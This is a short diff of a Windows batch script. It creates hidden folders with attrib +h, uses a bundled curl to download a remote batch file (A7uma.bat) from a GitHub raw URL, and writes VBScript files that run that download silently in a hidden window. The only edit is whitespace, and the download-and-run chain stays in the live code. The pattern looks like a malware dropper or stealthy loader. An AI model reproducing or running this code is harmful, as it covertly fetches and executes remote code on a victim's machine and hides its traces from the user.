@@ -5,7 +5,7 @@ attrib +h %homedrive%\curl
 attrib +h %homedrive%\A7uma
 mkdir %homedrive%\ShiniGami
 attrib +h %homedrive%\ShiniGami
-%homedrive%\curl\bin\curl.exe -L https://raw.githubusercontent.com/l-urk/Akuma/main/A7uma.bat > %homedrive%\ShiniGami\A7uma.bat
+%homedrive%\curl\bin\curl.exe -L https://raw.githubusercontent.com/l-urk/Akuma/main/A7uma.bat> %homedrive%\ShiniGami\A7uma.bat
 echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\死神.vbs
 echo objShell.Run "%homedrive%\ShiniGami\A7uma.bat", 0, False >> %homedrive%\Akuma\死神.vbs
 echo Set objShell = CreateObject("Shell.Application") >> %homedrive%\Akuma\beyondbirthday.vbs
